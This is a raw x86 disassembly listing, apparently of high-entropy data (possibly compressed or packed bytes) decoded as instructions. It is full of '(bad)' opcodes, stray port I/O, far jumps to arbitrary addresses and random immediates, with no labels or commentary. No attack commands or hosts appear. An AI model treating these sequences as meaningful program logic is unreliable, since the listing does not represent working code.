  4240e1:	outs   dx,BYTE PTR ds:[esi]
  4240e2:	lods   eax,DWORD PTR es:[esi]
  4240e4:	adc    cl,cl
  4240e6:	adc    eax,0x6db29461
  4240eb:	or     ah,BYTE PTR [ebx+0x0]
	...
  424156:	jl     0x4241b0
  424158:	cs mov cl,0x2e
  42415b:	idiv   edi
  42415d:	(bad)  
  42415f:	jne    0x424128
  424161:	iret   
  424162:	sub    DWORD PTR [eax-0x7d446819],0x1
  424169:	add    bh,bh
  42416b:	add    BYTE PTR [eax],al
  42416d:	add    BYTE PTR [esi+edi*4],ah
  424170:	cli    
  424171:	in     al,0xa1
  424173:	fst    DWORD PTR [edi]
  424175:	rcr    DWORD PTR [ebp+0x47],1
  424178:	push   ds
  424179:	and    al,0xc4
  42417b:	cmp    ebx,DWORD PTR [esi+0x68cec602]
  424181:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424182:	imul   ebx,DWORD PTR [edi+ebx*1+0x4e0f14c8],0xe92d568e
  42418d:	xlat   BYTE PTR ds:[ebx]
  42418e:	mov    es,WORD PTR [ecx-0x6385798e]
  424194:	daa    
  424195:	push   es
  424196:	adc    esp,DWORD PTR [ebx-0x76d7e29a]
  42419c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42419d:	xchg   BYTE PTR [edx+0x2b94bdc5],cl
  4241a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241a4:	outs   dx,DWORD PTR ds:[esi]
  4241a5:	push   edi
  4241a6:	mov    cl,0x9a
  4241a8:	mov    esp,0x3d89db31
  4241ad:	je     0x42416d
  4241af:	adc    eax,DWORD PTR [ebx]
  4241b1:	and    bl,BYTE PTR [ebx+0x17]
  4241b4:	out    dx,al
  4241b5:	retf   
  4241b6:	aad    0x3c
  4241b8:	mov    ecx,0xc22a760a
  4241bd:	or     DWORD PTR [edx-0xed4359e],esp
  4241c3:	das    
  4241c4:	dec    eax
  4241c5:	mov    ch,0x89
  4241c7:	test   DWORD PTR [ecx-0x26],0x3def1065
  4241ce:	adc    eax,0x80b79246
  4241d3:	add    BYTE PTR [ebp-0x7d],bl
  4241d6:	mov    edx,0x8d4c69db
  4241db:	inc    esp
  4241dc:	lods   eax,DWORD PTR ds:[esi]
  4241dd:	aas    
  4241de:	sub    al,0x20
  4241e0:	push   esi
  4241e1:	push   0xbd7ff3bf
  4241e6:	mov    bl,0x40
  4241e8:	retf   0xcd3
  4241eb:	stc    
  4241ec:	mov    ebx,0x364b6a4
  4241f1:	xor    ah,BYTE PTR [ebx]
  4241f3:	or     eax,0x108e435c
  4241f8:	and    DWORD PTR [eax-0x34],eax
  4241fb:	loope  0x424233
  4241fd:	sub    al,0x9
  4241ff:	jp     0x424216
  424201:	mov    esp,0x41635761
  424206:	mov    esi,0x8ebd89cb
  42420b:	aam    0x0
  42420d:	xchg   ecx,eax
  42420e:	push   es
  42420f:	pusha  
  424210:	xlat   BYTE PTR ds:[ebx]
  424211:	faddp  st(5),st
  424213:	test   ch,0x34
  424216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424217:	pusha  
  424218:	jno    0x424213
  42421a:	or     al,0x92
  42421c:	dec    eax
  42421d:	not    ecx
  42421f:	pop    ds
  424220:	rcl    al,0x2e
  424223:	das    
  424224:	or     BYTE PTR ds:0x387369d,0xde
  42422b:	imul   BYTE PTR [esi+0x1c]
  42422e:	xchg   DWORD PTR [ecx+edx*8],ebp
  424231:	scas   al,BYTE PTR es:[edi]
  424232:	inc    edx
  424233:	int3   
  424234:	xrelease mov DWORD PTR [eax-0x78],0x8eaa1fec
  42423c:	(bad)  
  42423d:	lahf   
  42423e:	dec    ecx
  42423f:	push   ebp
  424240:	imul   edi,DWORD PTR [ebp-0x58],0xffffffaf
  424244:	(bad)  
  424246:	not    DWORD PTR [eax+ecx*2]
  424249:	les    ebx,FWORD PTR [ebx]
  42424b:	inc    ebx
  42424c:	or     ch,BYTE PTR [esi]
  42424e:	mov    cl,0xca
  424250:	xchg   DWORD PTR [ebx+0x21a2bca4],edi
  424256:	lock cmp al,0x26
  424259:	dec    esp
  42425a:	xchg   esi,eax
  42425b:	inc    edx
  42425c:	and    DWORD PTR [edi-0x4bafc4d1],0xffffffe3
  424263:	xchg   edx,eax
  424264:	jge    0x42421f
  424266:	adc    eax,0xf839f0a8
  42426b:	mov    al,ds:0xcc
	...
  4242d4:	add    BYTE PTR [eax],al
  4242d6:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  4242dd:	push   DWORD PTR [ecx+0x7]
  4242e0:	sub    al,0x5c
  4242e2:	data16 lods al,BYTE PTR ds:[esi]
  4242e5:	and    al,0xba
  4242e7:	add    DWORD PTR [ecx],0x0
  4242ea:	inc    DWORD PTR [eax]
  4242ec:	add    BYTE PTR [eax],al
  4242ee:	adc    eax,0xa4b6b8d8
  4242f3:	lock jo 0x424293
  4242f6:	jl     0x4242f0
  4242f8:	mov    eax,ds:0xab14a0aa
  4242fd:	das    
  4242fe:	leave  
  4242ff:	sti    
  424300:	(bad)  
  424302:	pop    ebx
  424303:	xor    al,0x23
  424305:	cmp    eax,0x32ab75b3
  42430a:	jge    0x424371
  42430c:	sub    DWORD PTR [ebx],0xe
  42430f:	test   DWORD PTR [ebx+eax*1+0x59e42612],ebp
  424316:	xor    eax,0xfcf1de28
  42431b:	xlat   BYTE PTR ds:[ebx]
  42431c:	add    BYTE PTR [edi-0x3a],bh
  42431f:	jns    0x424372
  424321:	scas   eax,DWORD PTR es:[edi]
  424322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424323:	std    
  424324:	push   edx
  424325:	loope  0x42433b
  424327:	sbb    eax,DWORD PTR [eax]
  424329:	(bad)  
  42432a:	into   
  42432b:	mov    cl,0x9f
  42432d:	scas   al,BYTE PTR es:[edi]
  42432e:	aad    0x8b
  424330:	aaa    
  424331:	cmp    ebp,DWORD PTR [edi]
  424333:	xchg   ebx,eax
  424334:	int3   
  424335:	aad    0xbf
  424337:	add    BYTE PTR [edi+0x461f0b02],cl
  42433d:	push   0xe3bd1875
  424342:	cmp    ecx,DWORD PTR [edx+0x6d]
  424345:	xchg   esi,eax
  424346:	popa   
  424347:	scas   eax,DWORD PTR es:[edi]
  424348:	adc    eax,0x1fb5f39c
  42434d:	sbb    BYTE PTR [edi],al
  42434f:	add    al,0xbf
  424351:	mov    esp,0xdfc2e1aa
  424356:	rol    ah,1
  424358:	mov    dl,0x94
  42435a:	mov    cl,0xa4
  42435c:	mov    esi,0xb540c0ff
  424361:	and    al,0xd4
  424363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424364:	das    
  424365:	fisub  WORD PTR [edi+0x10]
  424368:	js     0x424386
  42436a:	test   BYTE PTR [esi-0x15ef118b],ah
  424370:	mov    al,0xe8
  424372:	mov    al,ds:0x9ff9c269
  424377:	(bad)  
  424378:	in     al,dx
  424379:	cmp    ebp,DWORD PTR [ebp-0x74abcade]
  42437f:	jo     0x424379
  424381:	fistp  DWORD PTR [esp+esi*4+0x33]
  424385:	je     0x424384
  424387:	or     al,0x9b
  424389:	rcr    BYTE PTR [ebp+edi*8-0x30],1
  42438d:	test   DWORD PTR [ecx+0x4f],0xb78b533d
  424394:	and    BYTE PTR [esi+0x6b00b3d6],al
  42439a:	xchg   ebp,eax
  42439b:	or     al,dh
  42439d:	cmp    BYTE PTR ds:[esp+edx*8],bl
  4243a1:	mov    dh,0xbd
  4243a3:	mov    DWORD PTR [edx+eax*1],0xd1db839a
  4243aa:	mov    DWORD PTR [ebx+0x6cfaf04d],eax
  4243b0:	loope  0x424403
  4243b2:	pop    esi
  4243b3:	mov    DWORD PTR [edi+0x787e3086],0x63c1588c
  4243bd:	pop    edx
  4243be:	fnstsw WORD PTR [edx]
  4243c0:	dec    edx
  4243c1:	pop    esi
  4243c2:	ror    al,cl
  4243c4:	add    BYTE PTR [ebx+0x4c],cl
  4243c7:	and    eax,0x35eea88b
  4243cc:	sbb    ecx,DWORD PTR [edi]
  4243ce:	xor    BYTE PTR [esi-0x12],cl
  4243d1:	addr16 sbb bl,ah
  4243d4:	(bad)  
  4243d6:	jb     0x4243a0
  4243d8:	adc    eax,0x1d771738
  4243dd:	sbb    DWORD PTR [ecx-0x685da201],0xffffffe5
  4243e4:	adc    edi,0xffffffd3
  4243e7:	repnz fisttp DWORD PTR [ebx+esi*4+0xc5cf]
	...
  424453:	add    BYTE PTR [eax],al
  424455:	add    BYTE PTR [edx-0x24582da],cl
  42445b:	sti    
  42445c:	iret   
  42445d:	ss aam 0xb
  424460:	push   ss
  424461:	jno    0x4244be
  424463:	out    0xca,al
  424465:	dec    edi
  424466:	mov    ecx,0xff000184
  42446b:	add    BYTE PTR [eax],al
  42446d:	add    BYTE PTR [eax-0x4d],bh
  424470:	scas   al,BYTE PTR es:[edi]
  424471:	xchg   DWORD PTR [ebp+0x3751afb9],eax
  424477:	lds    esi,FWORD PTR [eax+0x571314b2]
  42447d:	int    0xe1
  42447f:	(bad)  
  424480:	retf   
  424481:	pop    ds
  424482:	cmp    cl,BYTE PTR [ebx]
  424484:	or     DWORD PTR [ecx],esp
  424486:	sub    al,0x25
  424488:	addr16 mov eax,ds:0x768c
  42448c:	hlt    
  42448d:	sub    ah,dh
  42448f:	pop    ebp
  424490:	in     eax,0x62
  424492:	je     0x4244ba
  424494:	inc    esi
  424495:	loopne 0x42446e
  424497:	pop    ebp
  424498:	adc    cl,BYTE PTR [edi-0x64c0481e]
  42449e:	out    dx,eax
  42449f:	retf   
  4244a0:	sbb    bl,dl
  4244a2:	mov    ecx,0x7f66cfd0
  4244a7:	xor    BYTE PTR [esi+0x4c9b428c],bh
  4244ad:	mov    bl,cl
  4244af:	aad    0x80
  4244b1:	rcl    ebx,0xfa
  4244b4:	popf   
  4244b5:	and    DWORD PTR [edx],ebx
  4244b7:	shr    BYTE PTR [ecx],cl
  4244b9:	rol    BYTE PTR [edi+0x617b82df],1
  4244bf:	(bad)  
  4244c0:	mov    al,BYTE PTR [eax+0x72]
  4244c3:	jmp    0xccd6a74d
  4244c8:	and    ebp,ebp
  4244ca:	pushf  
  4244cb:	shl    DWORD PTR [ecx-0x45],0x71
  4244cf:	(bad)  
  4244d0:	repnz imul ecx,edi,0x646ab329
  4244d7:	xor    edx,eax
  4244d9:	mov    edi,0xc7b27318
  4244de:	xlat   BYTE PTR ds:[ebx]
  4244df:	xor    ecx,DWORD PTR [edi]
  4244e1:	addr16 jne 0x4244bb
  4244e4:	popa   
  4244e5:	outs   dx,BYTE PTR ds:[esi]
  4244e6:	xor    BYTE PTR [ebp-0x1e],ah
  4244e9:	dec    ebx
  4244ea:	outs   dx,BYTE PTR ds:[esi]
  4244eb:	int3   
  4244ec:	outs   dx,DWORD PTR ds:[esi]
  4244ed:	dec    edi
  4244ee:	push   0x6a9acfcf
  4244f3:	js     0x42456e
  4244f5:	adc    eax,0xfc711f7c
  4244fa:	jbe    0x42451e
  4244fc:	aas    
  4244fd:	add    al,0x58
  4244ff:	xchg   ebx,eax
  424500:	lea    ebp,[ecx+0x23]
  424503:	push   esp
  424504:	jle    0x4244dc
  424506:	loopne 0x4244b9
  424508:	and    eax,0xc7dcc5f3
  42450d:	adc    bl,dh
  42450f:	or     BYTE PTR [esp+ebx*4-0x35],bl
  424513:	mov    bl,0x61
  424515:	jle    0x424522
  424517:	dec    ecx
  424518:	mov    BYTE PTR [ebx],ah
  42451a:	hlt    
  42451b:	mov    dh,0x55
  42451d:	sub    bl,dl
  42451f:	xor    al,0x7a
  424521:	push   0x2fdf45f7
  424526:	pop    esi
  424527:	ficomp DWORD PTR [edx-0x94376ad]
  42452d:	and    DWORD PTR [edx+0x7af38799],ebp
  424533:	pushf  
  424534:	loop   0x424501
  424536:	jmp    0x4244d0
  424538:	idiv   dh
  42453a:	retf   
  42453b:	inc    edi
  42453c:	add    DWORD PTR [esi+esi*1],edx
  42453f:	lock sub al,BYTE PTR [ecx]
  424542:	jnp    0x4244eb
  424544:	xchg   BYTE PTR [eax],al
  424546:	loope  0x4245aa
  424548:	jnp    0x42455d
  42454a:	out    0x58,al
  42454c:	push   es
  42454d:	fist   DWORD PTR [ecx]
  42454f:	and    edx,DWORD PTR [edi-0x25381357]
  424555:	ds in  eax,dx
  424557:	adc    DWORD PTR [ebp-0x3],esp
  42455a:	adc    dh,BYTE PTR cs:[esi+0x70]
  42455e:	jmp    DWORD PTR [esi-0x7fada319]
  424564:	fiadd  DWORD PTR [ebx-0x1b]
  424567:	lods   al,BYTE PTR ds:[esi]
  424568:	add    ebp,edi
  42456a:	adc    eax,0x9877
	...
  4245d3:	add    BYTE PTR [eax],al
  4245d5:	add    al,ah
  4245d7:	outs   dx,DWORD PTR ds:[esi]
  4245d8:	xchg   esi,eax
  4245d9:	inc    edx
  4245da:	lahf   
  4245db:	sti    
  4245dc:	hlt    
  4245dd:	out    dx,eax
  4245de:	dec    eax
  4245df:	rol    DWORD PTR [esp+ebx*4-0x80],1
  4245e3:	mov    esp,0x85b83fca
  4245e8:	add    DWORD PTR [eax],eax
  4245ea:	inc    DWORD PTR [eax]
  4245ec:	add    BYTE PTR [eax],al
  4245ee:	adc    DWORD PTR [esi+edx*4-0x1900ed51],0xaae4fe41
  4245f9:	aad    0x38
  4245fb:	mov    edx,0x13a67ed3
  424600:	es adc bh,dl
  424603:	stc    
  424604:	and    esp,DWORD PTR [edi]
  424606:	lea    eax,[ecx+0x3c28ad22]
  42460c:	jmp    0x673850d8
  424611:	stos   DWORD PTR es:[edi],eax
  424612:	inc    esp
  424613:	pop    edi
  424614:	dec    esp
  424615:	push   es
  424616:	daa    
  424617:	pushf  
  424618:	jno    0x4245bc
  42461a:	fsubr  DWORD PTR [edi+0x34baa216]
  424620:	push   edx
  424621:	xchg   esi,eax
  424622:	sub    BYTE PTR [eax+0x5731b328],0x8e
  424629:	xchg   edx,eax
  42462a:	sbb    DWORD PTR [esi],edi
  42462c:	push   ebx
  42462d:	cli    
  42462e:	jbe    0x4245fb
  424630:	xchg   ebx,eax
  424631:	pop    ss
  424632:	push   0xffffff80
  424634:	scas   eax,DWORD PTR es:[edi]
  424635:	dec    esp
  424636:	hlt    
  424637:	out    dx,eax
  424638:	loop   0x42465c
  42463a:	push   edx
  42463b:	pushf  
  42463c:	sbb    ah,BYTE PTR [eax-0x30]
  42463f:	cmp    ch,ch
  424641:	cdq    
  424642:	xchg   ebx,eax
  424643:	jg     0x424687
  424645:	test   BYTE PTR [ecx-0x61],cl
  424648:	je     0x4245fa
  42464a:	adc    ch,bl
  42464c:	mov    DWORD PTR [ebp+0x4e],esp
  42464f:	ss out dx,al
  424651:	pop    eax
  424652:	lea    edi,[ebx+ebx*1-0x173f3e02]
  424659:	lock sub bl,bl
  42465c:	jnp    0x424612
  42465e:	or     eax,0xb681c3f1
  424663:	lea    esp,[edx+0x69]
  424666:	fs dec esi
  424668:	add    al,0x23
  42466a:	add    dl,BYTE PTR [ebx]
  42466c:	add    ch,BYTE PTR [ebx+0x57f19555]
  424672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424673:	sbb    eax,0x4923165a
  424678:	push   edi
  424679:	stc    
  42467a:	adc    eax,edi
  42467c:	inc    ecx
  42467d:	inc    ebx
  42467e:	jmp    0x33cf:0xfc111102
  424685:	and    BYTE PTR [esi-0x2dd584aa],cl
  42468b:	mov    dh,0x61
  42468d:	cs jbe 0x42463d
  424690:	mov    dl,0x6
  424692:	aaa    
  424693:	stos   DWORD PTR es:[edi],eax
  424694:	clc    
  424695:	(bad)  
  424696:	hlt    
  424697:	ja     0x424634
  424699:	jns    0x424668
  42469b:	lea    ebx,[eax]
  42469d:	repnz cmp edi,edi
  4246a0:	mov    edx,0xcb8059f5
  4246a5:	out    dx,eax
  4246a6:	and    al,0x21
  4246a8:	sbb    ch,BYTE PTR [eax+0x7e28e64a]
  4246ae:	push   edi
  4246af:	mov    ds:0xca4ca589,eax
  4246b4:	sub    BYTE PTR [ebp+ebp*2-0x5],dh
  4246b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4246b9:	mov    dh,0x1b
  4246bb:	stos   BYTE PTR es:[di],al
  4246bd:	fdivp  st(0),st
  4246bf:	out    dx,eax
  4246c0:	leave  
  4246c1:	loope  0x42465d
  4246c3:	out    dx,al
  4246c4:	xchg   esp,edx
  4246c6:	inc    eax
  4246c7:	mul    DWORD PTR [edx+0x668f7408]
  4246cd:	scas   eax,DWORD PTR es:[edi]
  4246ce:	adc    BYTE PTR [edx-0x5e1cc473],bh
  4246d4:	pop    ss
  4246d5:	imul   eax,DWORD PTR [esi],0xdc25b17c
  4246db:	mov    DWORD PTR [eax-0x5d312291],edi
  4246e1:	lahf   
  4246e2:	jmp    0x41a41064
  4246e7:	push   ds
  4246e8:	lds    esi,FWORD PTR [esi+0x21]
  4246eb:	cmp    eax,0xda
	...
  424754:	add    BYTE PTR [eax],al
  424756:	mov    esp,0xfefffc92
  42475b:	(bad)  
  42475c:	mov    edi,0xb298dbd3
  424761:	mov    BYTE PTR [ebx+0x3a],al
  424764:	or     eax,0x186b7f6
  424769:	add    bh,bh
  42476b:	add    BYTE PTR [eax],al
  42476d:	add    al,bl
  42476f:	or     DWORD PTR [ebx-0x19],ecx
  424772:	outs   dx,BYTE PTR ss:[esi]
  424774:	pop    ebp
  424775:	ds adc eax,0x54a3a886
  42477b:	retf   
  42477c:	jl     0x424727
  42477e:	add    BYTE PTR [esi-0x1aeabe0d],dl
  424784:	ja     0x4247ce
  424786:	iret   
  424787:	mov    ch,0x86
  424789:	or     bl,0xd3
  42478c:	xchg   DWORD PTR [ebx],esi
  42478e:	mov    esi,0x57b1b98c
  424793:	mov    eax,ds:0x3c560ef8
  424798:	xchg   edi,eax
  424799:	dec    ebp
  42479a:	push   edx
  42479b:	xchg   ebp,eax
  42479c:	lea    esp,[ecx]
  42479e:	xor    bl,BYTE PTR [edx]
  4247a0:	cmp    bl,BYTE PTR [eax]
  4247a2:	cld    
  4247a3:	mov    ecx,0xb7f5fc73
  4247a8:	imul   ecx,ebp,0x12e12023
  4247ae:	clc    
  4247af:	clc    
  4247b0:	mov    edi,0xfc5a970e
  4247b5:	push   ecx
  4247b6:	mov    ds:0x1ec8fcf7,eax
  4247bb:	ins    DWORD PTR es:[edi],dx
  4247bc:	ror    DWORD PTR [esi-0x17c9c7e2],cl
  4247c2:	dec    BYTE PTR [edx+0x2e]
  4247c5:	jmp    0x42478a
  4247c7:	sbb    eax,0xaf10bc08
  4247cc:	(bad)  
  4247cd:	rcl    DWORD PTR [eax],cl
  4247cf:	stos   DWORD PTR es:[edi],eax
  4247d0:	mov    esi,0xe4e330ee
  4247d5:	stc    
  4247d6:	in     al,dx
  4247d7:	jae    0x4247a9
  4247d9:	stos   DWORD PTR es:[edi],eax
  4247da:	in     eax,dx
  4247db:	jge    0x42484d
  4247dd:	xlat   BYTE PTR ds:[ebx]
  4247de:	pop    es
  4247df:	cli    
  4247e0:	jne    0x424846
  4247e2:	das    
  4247e3:	mov    ebx,0xa253c8c
  4247e8:	into   
  4247e9:	shr    dl,1
  4247eb:	ins    DWORD PTR es:[edi],dx
  4247ec:	pop    eax
  4247ed:	and    eax,0x3e6cb58f
  4247f2:	cwde   
  4247f3:	in     al,0xb5
  4247f5:	daa    
  4247f6:	rcl    BYTE PTR [eax+0x6448ad27],0xe4
  4247fd:	xor    BYTE PTR [eax+0x193c0904],ah
  424803:	jns    0x424786
  424805:	add    BYTE PTR [eax+edx*1],cl
  424808:	inc    edi
  424809:	div    DWORD PTR [ecx+0xa]
  42480c:	cwde   
  42480d:	shl    DWORD PTR [edx-0xb],0xd3
  424811:	dec    eax
  424812:	lock clc 
  424814:	dec    ebp
  424815:	or     eax,0x24a457a1
  42481a:	aaa    
  42481b:	dec    edi
  42481c:	mov    BYTE PTR [edi+eax*2],bh
  42481f:	xchg   esp,eax
  424820:	mov    al,ds:0xd31b9850
  424825:	mov    al,ds:0x18ee5751
  42482a:	cmp    ebx,DWORD PTR [esi+0x43f15f77]
  424830:	push   ecx
  424831:	loopne 0x424883
  424833:	xor    al,0x55
  424835:	in     eax,0x80
  424837:	inc    esp
  424838:	lods   al,BYTE PTR ds:[esi]
  424839:	mov    edx,DWORD PTR [edx+eax*8-0x36]
  42483d:	xchg   esp,eax
  42483e:	mov    eax,ds:0x802f60a8
  424843:	test   DWORD PTR [ebp+0x7e],edi
  424846:	push   edx
  424847:	aad    0x56
  424849:	shl    ecx,0x6e
  42484c:	scas   eax,DWORD PTR es:[edi]
  42484d:	ds jp  0x424809
  424850:	jae    0x42486c
  424852:	or     al,0x6e
  424854:	cmp    al,0x36
  424856:	scas   eax,DWORD PTR es:[edi]
  424857:	ror    dh,cl
  424859:	inc    edx
  42485a:	hlt    
  42485b:	in     eax,dx
  42485c:	jl     0x424849
  42485e:	sbb    DWORD PTR [ecx-0x52fb0001],0x1
  424865:	mov    esp,0x2aeeb272
  42486a:	js     0x42481d
  42486c:	sub    al,0x0
	...
  4248d6:	and    bl,BYTE PTR [eax-0x7c]
  4248d9:	out    dx,eax
  4248da:	(bad)  
  4248db:	jmp    FWORD PTR [ebx-0x23]
  4248de:	lock test BYTE PTR [ebx],dl
  4248e1:	xchg   esp,eax
  4248e2:	in     eax,0xc0
  4248e4:	pop    eax
  4248e5:	shl    DWORD PTR [esi-0xfffe79],cl
  4248eb:	add    BYTE PTR [eax],al
  4248ed:	add    BYTE PTR [eax+0x3339bc26],bl
  4248f3:	inc    ebp
  4248f4:	or     esi,DWORD PTR [ecx+0x63d53baf]
  4248fa:	add    BYTE PTR [ecx],0x65
  4248fd:	jg     0x424946
  4248ff:	out    dx,eax
  424900:	(bad)  [ecx+eiz*2+0x74]
  424904:	mov    ebp,0x7cc0b179
  424909:	fstp   TBYTE PTR [ebx]
  42490b:	mov    WORD PTR [edi-0x73],ds
  42490e:	xor    esp,DWORD PTR [edx+0x63bd6b82]
  424914:	add    edx,DWORD PTR [edi+ebx*2-0x5fa6c578]
  42491b:	lods   al,BYTE PTR ds:[esi]
  42491c:	imul   esp,DWORD PTR [ebx+0x3c],0xffffffdf
  424920:	mov    ebp,0x33abd425
  424925:	adc    DWORD PTR [edi+esi*8+0x5e],0x11a69a36
  42492d:	cmp    eax,0xf2a2694
  424932:	fs je  0x4248d7
  424935:	cmp    ch,BYTE PTR es:[eax]
  424938:	pop    edx
  424939:	mov    ah,0x6d
  42493b:	xlat   BYTE PTR ds:[ebx]
  42493c:	inc    eax
  42493d:	sti    
  42493e:	cwde   
  42493f:	cmp    dh,0xdc
  424942:	mov    ah,0x14
  424944:	ds gs (bad) 
  424947:	(bad)  
  424948:	or     al,0xbb
  42494a:	loop   0x424987
  42494c:	dec    esi
  42494d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42494e:	int    0xf3
  424950:	adc    eax,0xfc0a083b
  424955:	jmp    0xf9c2:0x3fe4d752
  42495c:	cmc    
  42495d:	lea    esi,[ecx]
  42495f:	pop    ebp
  424960:	fcos   
  424962:	lea    ebx,[edi+0x79f231ad]
  424968:	rcr    BYTE PTR [esi+ebp*2],cl
  42496b:	mov    al,ds:0x814d282e
  424970:	xchg   ecx,eax
  424971:	dec    edx
  424972:	dec    ecx
  424973:	cdq    
  424974:	sbb    DWORD PTR [edx+0x6d],esp
  424977:	mov    ah,0xa0
  424979:	fist   DWORD PTR [ebp+0x78]
  42497c:	ins    BYTE PTR es:[edi],dx
  42497d:	mov    ecx,0x40c19dc5
  424982:	sti    
  424983:	cmp    BYTE PTR [edi+esi*8-0x3b089eb],dl
  42498a:	(bad)  
  42498b:	jae    0x424946
  42498d:	and    bl,BYTE PTR [esi+0x53e4f9e4]
  424993:	jp     0x424955
  424995:	jns    0x42495d
  424997:	xchg   ecx,eax
  424998:	dec    ebx
  424999:	fld    QWORD PTR [esp+esi*4]
  42499c:	pop    edx
  42499d:	imul   edi,DWORD PTR [ebp+0x15],0x9b75fffb
  4249a4:	lds    eax,FWORD PTR [ecx+ebx*2]
  4249a7:	sbb    eax,0xa612bc91
  4249ac:	lods   eax,DWORD PTR ds:[esi]
  4249ad:	xchg   esi,eax
  4249ae:	xchg   esp,eax
  4249af:	call   0x3345:0x4e14dcd8
  4249b6:	or     ecx,ecx
  4249b8:	lock mov edx,0x246d6a84
  4249be:	fsubp  st(4),st
  4249c0:	add    bh,ah
  4249c2:	pop    es
  4249c3:	mov    al,ds:0xdfe2ea16
  4249c8:	sbb    dh,BYTE PTR [ebx-0x18]
  4249cb:	sub    eax,esp
  4249cd:	pcmpeqb mm5,mm2
  4249d0:	js     0x4249a3
  4249d2:	mov    ch,0xe
  4249d4:	ss in  al,0x4e
  4249d7:	xor    BYTE PTR [ebx-0x57],al
  4249da:	sti    
  4249db:	mov    ch,0xfd
  4249dd:	mov    edx,0x2cf22b32
  4249e2:	inc    edx
  4249e3:	scas   eax,DWORD PTR es:[edi]
  4249e4:	sti    
  4249e5:	cmp    eax,ebx
  4249e7:	int3   
  4249e8:	cmc    
  4249e9:	inc    edi
  4249ea:	or     al,0x5
  4249ec:	sbb    al,BYTE PTR [eax]
	...
  424a56:	imul   ebx,DWORD PTR [eax],0x63
  424a59:	push   0x73
  424a5b:	jnp    0x424ac8
  424a5d:	sbb    DWORD PTR [eax-0x5c],ecx
  424a60:	push   esi
  424a61:	xor    bh,BYTE PTR [eax]
  424a63:	mov    ebp,0x88b558d3
  424a68:	add    DWORD PTR [eax],eax
  424a6a:	inc    DWORD PTR [eax]
  424a6c:	add    BYTE PTR [eax],al
  424a6e:	dec    eax
  424a6f:	pop    edx
  424a70:	fdivr  DWORD PTR [ebp-0x19ab5518]
  424a76:	jo     0x424a0b
  424a78:	(bad)  
  424a79:	lods   al,BYTE PTR ds:[esi]
  424a7a:	fisttp QWORD PTR [ebx+0xc28bfa1]
  424a80:	xchg   esp,eax
  424a81:	mov    ebx,0x9f3f5808
  424a86:	gs xchg ebx,eax
  424a88:	(bad)  
  424a89:	adc    al,0x57
  424a8b:	mov    eax,ds:0xa6b9efc
  424a90:	stos   DWORD PTR es:[edi],eax
  424a91:	mov    al,ds:0xe6fdabca
  424a96:	inc    edx
  424a97:	fs sbb ch,cl
  424a9a:	push   ecx
  424a9b:	cmp    BYTE PTR [edi],ah
  424a9d:	out    0xc9,al
  424a9f:	js     0x424ac8
  424aa1:	les    ebx,FWORD PTR [ebx]
  424aa3:	dec    esi
  424aa4:	cmp    dl,BYTE PTR [edi]
  424aa6:	ins    DWORD PTR es:[edi],dx
  424aa7:	arpl   WORD PTR [esi],bx
  424aa9:	mov    dl,0x61
  424aab:	pop    ds
  424aac:	cmp    dh,bh
  424aae:	fst    DWORD PTR [ebp+0x67]
  424ab1:	sub    al,0xbe
  424ab3:	or     bl,BYTE PTR [edi]
  424ab5:	adc    eax,DWORD PTR [edx]
  424ab7:	fild   DWORD PTR [ebx+0x6bc06f52]
  424abd:	(bad)  
  424abe:	sub    DWORD PTR [ebp-0x5f],ecx
  424ac1:	mov    ah,0x4e
  424ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ac4:	daa    
  424ac5:	inc    eax
  424ac6:	outs   dx,BYTE PTR ds:[esi]
  424ac7:	fdiv   DWORD PTR [edi+esi*2+0x10]
  424acb:	xchg   BYTE PTR [esi+eiz*8],cl
  424ace:	push   0xd6b3989b
  424ad3:	js     0x424a5d
  424ad5:	gs xchg ebp,eax
  424ad7:	cmp    edi,eax
  424ad9:	mov    edi,edx
  424adb:	jl     0x424b06
  424add:	xor    al,0x68
  424adf:	mov    BYTE PTR [edx+eax*8],bh
  424ae2:	lods   al,BYTE PTR ds:[esi]
  424ae3:	sub    bl,bl
  424ae5:	lods   eax,DWORD PTR ds:[esi]
  424ae6:	imul   edi,DWORD PTR [ebx+0x73],0xa7374ace
  424aed:	lea    esi,gs:[ebx]
  424af0:	ins    DWORD PTR es:[edi],dx
  424af1:	das    
  424af2:	jle    0x424b0d
  424af4:	dec    ebp
  424af5:	jecxz  0x424b58
  424af7:	call   0x24b4bfb
  424afc:	mov    ch,0x43
  424afe:	addr16 and ah,bl
  424b01:	ins    BYTE PTR es:[edi],dx
  424b02:	(bad)  
  424b03:	xchg   edx,eax
  424b04:	test   eax,0xc42c3870
  424b09:	and    al,0x27
  424b0b:	jmp    0x7f8e9576
  424b10:	sub    ah,cl
  424b12:	sbb    ebx,DWORD PTR [ebp-0x49a0003e]
  424b18:	loop   0x424b4a
  424b1a:	dec    ebp
  424b1b:	fisttp DWORD PTR [esi+0x3f]
  424b1e:	push   edx
  424b1f:	pop    esi
  424b20:	mov    esp,ebp
  424b22:	fwait
  424b23:	call   0xc7ae:0xe8cf2eef
  424b2a:	xchg   al,bh
  424b2c:	dec    esp
  424b2d:	sub    cl,bh
  424b2f:	fisub  DWORD PTR [ecx]
  424b31:	outs   dx,BYTE PTR ds:[esi]
  424b32:	push   esp
  424b33:	imul   DWORD PTR [eax+0x382d51e3]
  424b39:	pop    esp
  424b3a:	jnp    0x424b6a
  424b3c:	jmp    0x424af2
  424b3e:	jnp    0x424aee
  424b40:	cmp    bl,ah
  424b42:	ret    
  424b43:	jmp    0x424b93
  424b45:	outs   dx,DWORD PTR ds:[esi]
  424b46:	setne  ch
  424b49:	dec    esp
  424b4a:	in     al,0x3e
  424b4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b4d:	loope  0x424bc8
  424b4f:	mov    ds:0xea77a484,al
  424b54:	pop    es
  424b55:	scas   eax,DWORD PTR es:[edi]
  424b56:	rol    DWORD PTR [edi+0x4ec31376],1
  424b5c:	clc    
  424b5d:	ret    0xe423
  424b60:	pop    es
